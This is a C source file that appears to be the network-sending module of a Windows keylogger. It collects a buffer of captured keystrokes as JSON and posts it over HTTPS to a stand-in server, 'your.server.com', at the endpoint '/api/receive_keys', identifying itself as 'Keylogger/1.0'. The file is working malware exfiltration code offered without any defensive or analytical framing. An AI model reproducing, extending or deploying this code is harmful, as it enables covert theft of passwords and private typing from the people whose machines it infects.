#include "sender.h"
#include <winhttp.h>
#include <stdio.h>
#include <windows.h>
#include "buffer.h"
#include "utils.h"

#pragma comment(lib, "winhttp.lib")

static const wchar_t* SERVER = L"your.server.com";
static const wchar_t* ENDPOINT = L"/api/receive_keys";

bool send_data_https(const wchar_t* server, const wchar_t* endpoint, const char* json_data) {
    bool result = false;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    hSession = WinHttpOpen(L"Keylogger/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    if (!hSession) {
        log_error("WinHttpOpen failed");
        goto cleanup;
    }

    hConnect = WinHttpConnect(hSession, server, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        log_error("WinHttpConnect failed");
        goto cleanup;
    }

    hRequest = WinHttpOpenRequest(hConnect,
        L"POST",
        endpoint,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);

    if (!hRequest) {
        log_error("WinHttpOpenRequest failed");
        goto cleanup;
    }

    LPCWSTR headers = L"Content-Type: application/json";

    BOOL sendResult = WinHttpSendRequest(hRequest,
        headers,
        (DWORD)wcslen(headers),
        (LPVOID)json_data,
        (DWORD)strlen(json_data),
        (DWORD)strlen(json_data),
        0);

    if (!sendResult) {
        log_error("WinHttpSendRequest failed");
        goto cleanup;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        log_error("WinHttpReceiveResponse failed");
        goto cleanup;
    }

    result = true;

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    return result;
}

bool send_buffer_to_server(void) {
    char* json = buffer_get_json_and_clear();

    if (!json) {
        log_error("Buffer is empty, nothing to send");
        return false;
    }

    log_info("Sending JSON data: %s", json);

    bool success = send_data_https(SERVER, ENDPOINT, json);

    free(json);
    return success;
}
